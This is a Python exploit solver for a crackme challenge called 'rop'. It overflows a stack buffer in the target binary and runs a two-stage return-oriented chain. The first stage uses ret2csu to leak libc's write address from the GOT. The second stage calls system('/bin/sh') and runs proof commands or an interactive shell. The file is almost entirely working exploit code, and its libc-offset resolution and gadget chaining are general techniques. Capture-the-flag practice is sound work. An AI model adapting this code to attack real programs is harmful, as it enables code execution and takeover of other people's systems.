#!/usr/bin/env python3
"""
Solver for BitFriends's "rop" crackme (crackmes.one/crackme/5f3d7ed033c5d42a7c667d95).

Vuln: input() reads 0x280 bytes into a 64-byte stack buffer (read@plt),
      no canary, NX on, non-PIE. Return address is at offset 72.

No win function / system / /bin/sh / syscall gadget exist in the binary, so:
  Stage 1 : ret2csu -> write(1, write@GOT, 8)   (leak libc 'write'), return to main()
  Stage 2 : pop rdi; "/bin/sh"; ret; system()    (ret2libc, gadget from leaked libc)

The leak resolves the *running* libc, so offsets are taken from the libc the
target actually loads: pass it with --libc (default: the binary's own ldd libc).

Usage:
    ./rop-solve.py [--bin PATH] [--libc PATH] [--show]
No pwntools required.
"""
import argparse, struct, subprocess, re, os, sys, select, time, fcntl

p64 = lambda x: struct.pack("<Q", x)


def _nonblock(fd):
    fcntl.fcntl(fd, fcntl.F_SETFL, fcntl.fcntl(fd, fcntl.F_GETFL) | os.O_NONBLOCK)


def read_exact(fd, n, timeout=2.0):
    """Read exactly n bytes from a non-blocking fd (deterministic stages)."""
    buf = b""
    end = time.time() + timeout
    while len(buf) < n and time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.2)
        if r:
            try:
                d = os.read(fd, n - len(buf))
            except BlockingIOError:
                continue
            if not d:
                break
            buf += d
    return buf


def drain(fd, timeout=1.5):
    """Collect whatever the fd emits within a quiet window."""
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.2)
        if r:
            try:
                d = os.read(fd, 4096)
            except BlockingIOError:
                continue
            if not d:
                break
            buf += d
    return buf

# ---- binary (fixed, non-PIE) addresses ----
OFF_RET          = 72
MAIN             = 0x400537
CSU_POPS         = 0x40060a   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL         = 0x4005f0   # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]; ...
WRITE_GOT        = 0x601018   # holds resolved write() after main's first write()
RET              = 0x400416   # bare `ret` in the binary's .text (executable) for stack alignment


def libc_offsets(libc):
    """Resolve write/system, /bin/sh and a 'pop rdi; ret' gadget from a libc file."""
    out = subprocess.run(["readelf", "-sW", "--dyn-syms", libc],
                         capture_output=True, text=True).stdout
    sym = {}
    for line in out.splitlines():
        f = line.split()
        if len(f) >= 8 and f[3] == "FUNC":
            name = f[7].split("@")[0]
            if name in ("write", "system") and name not in sym and int(f[1], 16):
                sym[name] = int(f[1], 16)
    data = open(libc, "rb").read()
    binsh = data.find(b"/bin/sh\x00")
    pop_rdi = data.find(b"\x5f\xc3")        # pop rdi ; ret (file offset == vaddr in glibc text)
    for k in ("write", "system"):
        if k not in sym:
            raise SystemExit(f"[!] could not resolve {k} in {libc}")
    if min(binsh, pop_rdi) < 0:
        raise SystemExit("[!] could not find /bin/sh or 'pop rdi; ret' in libc")
    return sym["write"], sym["system"], binsh, pop_rdi


def ldd_libc(binary):
    out = subprocess.run(["ldd", binary], capture_output=True, text=True).stdout
    m = re.search(r"libc\.so\.6 => (\S+)", out)
    return m.group(1) if m else "/usr/lib/x86_64-linux-gnu/libc.so.6"


def stage1():
    """ret2csu: write(1, WRITE_GOT, 8) then return into main() for stage 2."""
    b  = b"A" * OFF_RET
    b += p64(CSU_POPS)
    b += p64(0)            # rbx = 0   (index into [r12+rbx*8])
    b += p64(1)            # rbp = 1   (loop runs once: cmp rbp,rbx after rbx++ -> equal)
    b += p64(WRITE_GOT)    # r12 = &write@GOT  -> call [r12] = write
    b += p64(1)            # r13 -> edi = 1 (stdout)
    b += p64(WRITE_GOT)    # r14 -> rsi = buf to print (leak write@GOT content)
    b += p64(8)            # r15 -> rdx = len = 8
    b += p64(CSU_CALL)
    b += p64(0) * 7        # add rsp,8 (1) + pop rbx,rbp,r12,r13,r14,r15 (6)
    b += p64(MAIN)         # re-enter main() -> input() for stage 2
    return b


def stage2(libc_base, write_off, system_off, binsh_off, pop_rdi_off):
    system  = libc_base + system_off
    binsh   = libc_base + binsh_off
    pop_rdi = libc_base + pop_rdi_off
    b  = b"A" * OFF_RET
    b += p64(RET)          # bare `ret` (binary .text) -> 16-byte align for system's movaps
    b += p64(pop_rdi)      # pop rdi ; ret
    b += p64(binsh)        # rdi = "/bin/sh"
    b += p64(system)       # system("/bin/sh")
    return b


def main():
    here = os.path.dirname(os.path.abspath(__file__))
    ap = argparse.ArgumentParser()
    ap.add_argument("--bin", default=os.path.join(here, "..", "original", "rop"))
    ap.add_argument("--libc", default=None)
    ap.add_argument("--show", action="store_true", help="dump the leak / chain sizes")
    ap.add_argument("-i", "--interactive", action="store_true",
                    help="drop into the popped shell instead of running a fixed proof")
    args = ap.parse_args()

    binary = os.path.abspath(args.bin)
    libc = os.path.abspath(args.libc) if args.libc else ldd_libc(binary)
    write_off, system_off, binsh_off, pop_rdi_off = libc_offsets(libc)
    if args.show:
        print(f"[*] libc        {libc}")
        print(f"[*] write off   {hex(write_off)}")
        print(f"[*] system off  {hex(system_off)}")
        print(f"[*] /bin/sh off {hex(binsh_off)}")
        print(f"[*] pop_rdi off {hex(pop_rdi_off)}")

    proc = subprocess.Popen([binary], stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                            bufsize=0)
    fd = proc.stdout.fileno()
    _nonblock(fd)

    # main prints "Input: " (7 bytes), then input() reads stage 1.
    assert read_exact(fd, 7) == b"Input: "
    proc.stdin.write(stage1())
    proc.stdin.flush()

    leak = read_exact(fd, 8)                   # 8-byte write() libc address
    if len(leak) != 8:
        raise SystemExit("[!] stage 1 leak failed")
    write_runtime = struct.unpack("<Q", leak)[0]
    libc_base = write_runtime - write_off
    if args.show:
        print(f"[+] leak write  {hex(write_runtime)}")
        print(f"[+] libc base   {hex(libc_base)}")
    if libc_base & 0xfff:
        print("[!] libc base not page-aligned -> wrong libc offsets?", file=sys.stderr)

    # stage 1 returned to main() -> "Input: " again, then reads stage 2.
    assert read_exact(fd, 7) == b"Input: "
    proc.stdin.write(stage2(libc_base, write_off, system_off,
                            binsh_off, pop_rdi_off))
    proc.stdin.flush()
    print("[+] stage 2 sent; shell spawned\n")

    if args.interactive:
        # Hand stdin/stdout over to the user.
        import tty
        try:
            while proc.poll() is None:
                r, _, _ = select.select([fd, sys.stdin], [], [], 0.2)
                if fd in r:
                    try:
                        d = os.read(fd, 4096)
                    except BlockingIOError:
                        d = b""
                    if d:
                        sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
                if sys.stdin in r:
                    line = sys.stdin.buffer.readline()
                    if not line:
                        break
                    proc.stdin.write(line); proc.stdin.flush()
        except KeyboardInterrupt:
            pass
        return

    # Non-interactive proof: run a few commands, print what the shell returns.
    proc.stdin.write(b"echo PROOF=$(whoami):$(id -u); uname -sm; "
                     b"echo PWNED_$((6*7)); exit\n")
    proc.stdin.flush()
    sys.stdout.buffer.write(drain(fd))
    sys.stdout.flush()
    proc.wait(timeout=2)


if __name__ == "__main__":
    main()
